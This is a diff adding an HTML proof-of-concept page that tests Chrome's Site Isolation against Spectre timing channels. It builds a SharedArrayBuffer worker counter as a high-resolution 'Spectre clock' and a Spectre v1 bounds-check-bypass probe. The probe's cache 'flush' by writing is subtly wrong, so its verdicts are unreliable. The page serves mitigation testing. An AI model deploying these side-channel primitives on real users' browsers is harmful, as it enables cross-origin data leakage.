@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>PoC: Spectre Timing Channels — Site Isolation Test (Chrome 145)</title>
+<style>
+  body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff41; padding: 20px; }
+  h1 { color: #ff3333; border-bottom: 1px solid #333; padding-bottom: 10px; }
+  h2 { color: #ffaa00; margin-top: 30px; }
+  .test-block { background: #111; border: 1px solid #333; border-radius: 4px; padding: 15px; margin: 10px 0; }
+  .result { padding: 5px 10px; margin: 3px 0; font-size: 13px; }
+  .pass { color: #00ff41; }
+  .fail { color: #ff3333; }
+  .info { color: #00bfff; }
+  .warn { color: #ffaa00; }
+  #summary { margin-top: 30px; padding: 15px; border: 2px solid #ffaa00; background: #1a1a00; }
+  button { background: #222; color: #00ff41; border: 1px solid #00ff41; padding: 8px 16px; cursor: pointer; margin: 5px; font-family: inherit; }
+  button:hover { background: #00ff41; color: #000; }
+  pre { background: #0d0d0d; padding: 10px; overflow-x: auto; border: 1px solid #222; }
+</style>
+</head>
+<body>
+
+<h1>[PoC] Spectre Timing Channel Tests — Chrome 145 Site Isolation</h1>
+<p class="info">
+  Tests whether Spectre-class timing side-channels can leak cross-origin data
+  despite Site Isolation. Covers SharedArrayBuffer availability, high-res timer
+  precision, cache-timing distinguishability, and speculative execution gadgets.
+</p>
+<p class="warn">⚠ Educational / authorized-testing only. Run in a controlled environment.</p>
+
+<button onclick="runAllTests()">▶ Run All Tests</button>
+<button onclick="clearResults()">Clear</button>
+
+<!-- ============================================================ -->
+<h2>1. SharedArrayBuffer Availability</h2>
+<div class="test-block" id="test-sab"></div>
+
+<!-- ============================================================ -->
+<h2>2. High-Resolution Timer Precision (performance.now)</h2>
+<div class="test-block" id="test-timer"></div>
+
+<!-- ============================================================ -->
+<h2>3. Cache vs. Uncached Timing Distinguishability</h2>
+<div class="test-block" id="test-cache"></div>
+
+<!-- ============================================================ -->
+<h2>4. SharedArrayBuffer High-Res Timer (Spectre Clock)</h2>
+<div class="test-block" id="test-sab-timer"></div>
+
+<!-- ============================================================ -->
+<h2>5. Bounds-Check Bypass Gadget Probe</h2>
+<div class="test-block" id="test-bcb"></div>
+
+<!-- ============================================================ -->
+<h2>6. Cross-Origin Iframe Memory Isolation</h2>
+<div class="test-block" id="test-iframe-iso"></div>
+
+<!-- ============================================================ -->
+<div id="summary"></div>
+
+<script>
+"use strict";
+
+/* ---------- helpers ---------- */
+function log(target, msg, cls = "info") {
+  const el = document.getElementById(target);
+  const d = document.createElement("div");
+  d.className = "result " + cls;
+  d.textContent = msg;
+  el.appendChild(d);
+}
+
+function clearResults() {
+  document.querySelectorAll(".test-block").forEach(b => b.innerHTML = "");
+  document.getElementById("summary").innerHTML = "";
+}
+
+const results = {};
+
+/* ============================================================
+   TEST 1 — SharedArrayBuffer Availability
+   Site Isolation + COOP/COEP headers are required for SAB in
+   modern Chrome. If SAB is available without those headers, the
+   browser may be mis-configured or vulnerable.
+   ============================================================ */
+function testSharedArrayBuffer() {
+  const t = "test-sab";
+  log(t, "[*] Checking window.SharedArrayBuffer ...");
+
+  if (typeof SharedArrayBuffer !== "undefined") {
+    try {
+      const sab = new SharedArrayBuffer(1024);
+      log(t, `[!] SharedArrayBuffer is AVAILABLE (${sab.byteLength} bytes allocated)`, "fail");
+      log(t, "[!] If this page lacks COOP/COEP headers, SAB should be blocked.", "fail");
+
+      /* Check if crossOriginIsolated flag is set */
+      if (self.crossOriginIsolated) {
+        log(t, "[i] crossOriginIsolated = true — SAB expected.", "info");
+        results["sab"] = "AVAILABLE (crossOriginIsolated)";
+      } else {
+        log(t, "[!] crossOriginIsolated = false — SAB should NOT be available.", "fail");
+        results["sab"] = "AVAILABLE WITHOUT ISOLATION — POSSIBLE ISSUE";
+      }
+    } catch (e) {
+      log(t, `[+] SharedArrayBuffer constructor threw: ${e.message}`, "pass");
+      results["sab"] = "BLOCKED (constructor threw)";
+    }
+  } else {
+    log(t, "[+] SharedArrayBuffer is NOT available (expected without COOP/COEP).", "pass");
+    results["sab"] = "BLOCKED";
+  }
+}
+
+/* ============================================================
+   TEST 2 — performance.now() Precision
+   Post-Spectre Chrome reduces precision to 5µs and adds jitter
+   when crossOriginIsolated is false.
+   ============================================================ */
+function testTimerPrecision() {
+  const t = "test-timer";
+  log(t, "[*] Sampling performance.now() 2000 times ...");
+
+  const samples = [];
+  for (let i = 0; i < 2000; i++) {
+    samples.push(performance.now());
+  }
+
+  /* Find minimum non-zero delta */
+  let minDelta = Infinity;
+  const deltas = new Set();
+  for (let i = 1; i < samples.length; i++) {
+    const d = samples[i] - samples[i - 1];
+    if (d > 0) {
+      deltas.add(d);
+      if (d < minDelta) minDelta = d;
+    }
+  }
+
+  const precisionUs = minDelta * 1000; /* convert ms -> µs */
+  log(t, `[i] Min non-zero delta: ${minDelta.toFixed(6)} ms (${precisionUs.toFixed(1)} µs)`);
+  log(t, `[i] Unique deltas observed: ${deltas.size}`);
+
+  if (precisionUs < 5) {
+    log(t, `[!] Timer precision < 5µs — high-res timer may be exploitable.`, "fail");
+    results["timer"] = `HIGH-RES (${precisionUs.toFixed(1)} µs)`;
+  } else if (precisionUs < 100) {
+    log(t, `[~] Timer precision ${precisionUs.toFixed(1)} µs — reduced but still measurable.`, "warn");
+    results["timer"] = `REDUCED (${precisionUs.toFixed(1)} µs)`;
+  } else {
+    log(t, `[+] Timer precision ≥ 100µs — effectively mitigated.`, "pass");
+    results["timer"] = `MITIGATED (${precisionUs.toFixed(1)} µs)`;
+  }
+}
+
+/* ============================================================
+   TEST 3 — Cache Timing Distinguishability
+   Access a same-origin resource, then re-access it. Measure
+   whether cached vs uncached timing is distinguishable.
+   ============================================================ */
+async function testCacheTiming() {
+  const t = "test-cache";
+  log(t, "[*] Measuring cached vs uncached fetch timing ...");
+
+  const url = window.location.href; /* fetch self */
+  const uncachedTimes = [];
+  const cachedTimes = [];
+
+  /* Uncached fetches (cache-bust with random param) */
+  for (let i = 0; i < 10; i++) {
+    const bustUrl = url + "?cachebust=" + Math.random() + Date.now();
+    const start = performance.now();
+    try {
+      await fetch(bustUrl, { cache: "no-store" });
+    } catch(e) { /* ignore */ }
+    uncachedTimes.push(performance.now() - start);
+  }
+
+  /* Cached fetches (allow cache) */
+  /* Prime cache */
+  try { await fetch(url, { cache: "force-cache" }); } catch(e) {}
+  for (let i = 0; i < 10; i++) {
+    const start = performance.now();
+    try {
+      await fetch(url, { cache: "force-cache" });
+    } catch(e) { /* ignore */ }
+    cachedTimes.push(performance.now() - start);
+  }
+
+  const avgUncached = uncachedTimes.reduce((a, b) => a + b, 0) / uncachedTimes.length;
+  const avgCached = cachedTimes.reduce((a, b) => a + b, 0) / cachedTimes.length;
+  const ratio = avgUncached / (avgCached || 1);
+
+  log(t, `[i] Avg uncached: ${avgUncached.toFixed(3)} ms`);
+  log(t, `[i] Avg cached:   ${avgCached.toFixed(3)} ms`);
+  log(t, `[i] Ratio (uncached/cached): ${ratio.toFixed(2)}x`);
+
+  if (ratio > 3) {
+    log(t, "[!] Cache/uncached clearly distinguishable — timing side-channel viable.", "fail");
+    results["cache"] = `DISTINGUISHABLE (ratio ${ratio.toFixed(2)}x)`;
+  } else if (ratio > 1.5) {
+    log(t, "[~] Moderate timing difference — limited side-channel.", "warn");
+    results["cache"] = `PARTIAL (ratio ${ratio.toFixed(2)}x)`;
+  } else {
+    log(t, "[+] Timing indistinguishable — cache side-channel mitigated.", "pass");
+    results["cache"] = `MITIGATED (ratio ${ratio.toFixed(2)}x)`;
+  }
+}
+
+/* ============================================================
+   TEST 4 — SharedArrayBuffer as High-Res Timer
+   Classic Spectre clock: increment a counter in a worker thread
+   using SAB, read from main thread for sub-µs resolution.
+   ============================================================ */
+function testSABTimer() {
+  const t = "test-sab-timer";
+
+  if (typeof SharedArrayBuffer === "undefined") {
+    log(t, "[+] SharedArrayBuffer unavailable — SAB timer not constructible.", "pass");
+    results["sab_timer"] = "BLOCKED (no SAB)";
+    return Promise.resolve();
+  }
+
+  log(t, "[*] Attempting to build SAB-based high-res timer ...");
+
+  return new Promise(resolve => {
+    try {
+      const sab = new SharedArrayBuffer(4);
+      const counter = new Int32Array(sab);
+
+      /* Worker that increments the counter continuously */
+      const workerCode = `
+        onmessage = function(e) {
+          const arr = new Int32Array(e.data);
+          while(true) { Atomics.add(arr, 0, 1); }
+        };
+      `;
+      const blob = new Blob([workerCode], { type: "application/javascript" });
+      const worker = new Worker(URL.createObjectURL(blob));
+      worker.postMessage(sab);
+
+      /* Let counter run for 100ms then sample */
+      setTimeout(() => {
+        const samples = [];
+        for (let i = 0; i < 100; i++) {
+          samples.push(Atomics.load(counter, 0));
+        }
+        worker.terminate();
+
+        const deltas = [];
+        for (let i = 1; i < samples.length; i++) {
+          deltas.push(samples[i] - samples[i - 1]);
+        }
+        const avgDelta = deltas.reduce((a, b) => a + b, 0) / deltas.length;
+
+        log(t, `[i] Counter value after ~100ms: ${samples[samples.length - 1]}`);
+        log(t, `[i] Average increment between reads: ${avgDelta.toFixed(1)}`);
+
+        if (avgDelta < 50) {
+          log(t, "[!] Very fine-grained SAB timer — Spectre clock is viable!", "fail");
+          results["sab_timer"] = `VIABLE (avg delta ${avgDelta.toFixed(1)})`;
+        } else {
+          log(t, "[~] SAB timer constructed but granularity may be insufficient.", "warn");
+          results["sab_timer"] = `CONSTRUCTED (avg delta ${avgDelta.toFixed(1)})`;
+        }
+        resolve();
+      }, 150);
+
+    } catch (e) {
+      log(t, `[+] SAB timer construction failed: ${e.message}`, "pass");
+      results["sab_timer"] = "BLOCKED";
+      resolve();
+    }
+  });
+}
+
+/* ============================================================
+   TEST 5 — Bounds-Check Bypass (BCB) Gadget Probe
+   Simulates a Spectre v1 pattern: conditional array access that
+   may be speculatively executed past bounds.  We detect whether
+   speculative reads change cache state observable via timing.
+   ============================================================ */
+function testBoundsCheckBypass() {
+  const t = "test-bcb";
+  log(t, "[*] Probing for bounds-check bypass via speculative execution ...");
+
+  /* Create a typed array and a probe array */
+  const ARRAY_SIZE = 16;
+  const victimArray = new Uint8Array(ARRAY_SIZE);
+  for (let i = 0; i < ARRAY_SIZE; i++) victimArray[i] = i;
+
+  /* Probe array: 256 entries × 4096 stride to avoid prefetcher */
+  const PROBE_STRIDE = 4096;
+  const probeArray = new Uint8Array(256 * PROBE_STRIDE);
+
+  /* Flush probe array from cache by writing it */
+  for (let i = 0; i < 256; i++) probeArray[i * PROBE_STRIDE] = 0;
+
+  /* Train branch predictor with in-bounds accesses */
+  const TRAIN_ROUNDS = 50;
+  const maliciousIndex = ARRAY_SIZE + 64; /* out of bounds */
+  const timings = new Float64Array(256);
+
+  for (let round = 0; round < 5; round++) {
+    /* Clear probe */
+    for (let i = 0; i < 256; i++) probeArray[i * PROBE_STRIDE] = 0;
+
+    /* Train + attack */
+    for (let i = 0; i < TRAIN_ROUNDS + 1; i++) {
+      /* Flush cache line for array length (would use clflush in native) */
+      const idx = (i < TRAIN_ROUNDS) ? (i % ARRAY_SIZE) : maliciousIndex;
+
+      /* Bounds-checked access — JS engine should prevent OOB but
+         speculative execution in JIT code might still touch the probe */
+      if (idx < victimArray.length) {
+        const val = victimArray[idx];
+        /* Dependent load into probe array */
+        const tmp = probeArray[val * PROBE_STRIDE];
+      }
+    }
+
+    /* Time probe array accesses */
+    for (let i = 0; i < 256; i++) {
+      const start = performance.now();
+      const tmp = probeArray[i * PROBE_STRIDE];
+      timings[i] += performance.now() - start;
+    }
+  }
+
+  /* Look for cache hits (fast accesses) in probe array */
+  let minTime = Infinity, minIdx = -1;
+  let avgTime = 0;
+  for (let i = 0; i < 256; i++) {
+    avgTime += timings[i];
+    if (timings[i] < minTime) {
+      minTime = timings[i];
+      minIdx = i;
+    }
+  }
+  avgTime /= 256;
+
+  log(t, `[i] Fastest probe index: ${minIdx} (${minTime.toFixed(4)} ms)`);
+  log(t, `[i] Average probe time: ${avgTime.toFixed(4)} ms`);
+
+  const threshold = avgTime * 0.5;
+  const suspiciousCount = Array.from(timings).filter(t => t < threshold).length;
+  log(t, `[i] Entries below 50% avg: ${suspiciousCount}/256`);
+
+  if (suspiciousCount > 0 && suspiciousCount < 10 && minTime < avgTime * 0.3) {
+    log(t, "[!] Potential speculative cache-line hit detected — BCB may be viable.", "fail");
+    results["bcb"] = "POTENTIAL HIT";
+  } else {
+    log(t, "[+] No clear speculative signal — JS-level BCB mitigated or timer too coarse.", "pass");
+    results["bcb"] = "MITIGATED / NO SIGNAL";
+  }
+}
+
+/* ============================================================
+   TEST 6 — Cross-Origin Iframe Memory Isolation
+   Verify that cross-origin iframes are process-isolated.
+   ============================================================ */
+function testIframeIsolation() {
+  const t = "test-iframe-iso";
+  log(t, "[*] Testing cross-origin iframe isolation ...");
+
+  /* Check Performance API for cross-origin entries */
+  const entries = performance.getEntriesByType("resource");
+  const crossOriginLeaks = entries.filter(e => {
+    /* If transferSize/encodedBodySize are 0 for cross-origin, it's protected */
+    return e.name.includes("://") &&
+           !e.name.startsWith(location.origin) &&
+           e.transferSize > 0;
+  });
+
+  if (crossOriginLeaks.length > 0) {
+    log(t, `[!] ${crossOriginLeaks.length} cross-origin resource(s) leak timing info.`, "fail");
+    crossOriginLeaks.forEach(e => log(t, `    → ${e.name} (transferSize=${e.transferSize})`, "fail"));
+    results["iframe_iso"] = `LEAKY (${crossOriginLeaks.length} entries)`;
+  } else {
+    log(t, "[+] No cross-origin resource timing leaks detected.", "pass");
+    results["iframe_iso"] = "ISOLATED";
+  }
+
+  /* Check process isolation via window.crossOriginIsolated */
+  log(t, `[i] crossOriginIsolated: ${self.crossOriginIsolated}`);
+  log(t, `[i] isSecureContext: ${self.isSecureContext}`);
+
+  /* Attempt to create a cross-origin iframe and access it */
+  const iframe = document.createElement("iframe");
+  iframe.src = "https://example.com";
+  iframe.style.display = "none";
+  document.body.appendChild(iframe);
+
+  setTimeout(() => {
+    try {
+      const doc = iframe.contentDocument;
+      if (doc) {
+        log(t, "[!] Could access cross-origin iframe contentDocument!", "fail");
+        results["iframe_iso"] += " + DOM ACCESS LEAK";
+      } else {
+        log(t, "[+] cross-origin iframe contentDocument is null (expected).", "pass");
+      }
+    } catch (e) {
+      log(t, `[+] Cross-origin access blocked: ${e.name}`, "pass");
+    }
+    iframe.remove();
+  }, 2000);
+}
+
+/* ============================================================
+   RUN ALL
+   ============================================================ */
+async function runAllTests() {
+  clearResults();
+  results["timestamp"] = new Date().toISOString();
+  results["userAgent"] = navigator.userAgent;
+
+  testSharedArrayBuffer();
+  testTimerPrecision();
+  await testCacheTiming();
+  await testSABTimer();
+  testBoundsCheckBypass();
+  testIframeIsolation();
+
+  /* Summary after iframe test settles */
+  setTimeout(renderSummary, 3000);
+}
+
+function renderSummary() {
+  const el = document.getElementById("summary");
+  el.innerHTML = "<h2 style='color:#ffaa00;margin-top:0'>Summary</h2>";
+  const pre = document.createElement("pre");
+  pre.textContent = JSON.stringify(results, null, 2);
+  el.appendChild(pre);
+}
+</script>
+</body>
+</html>
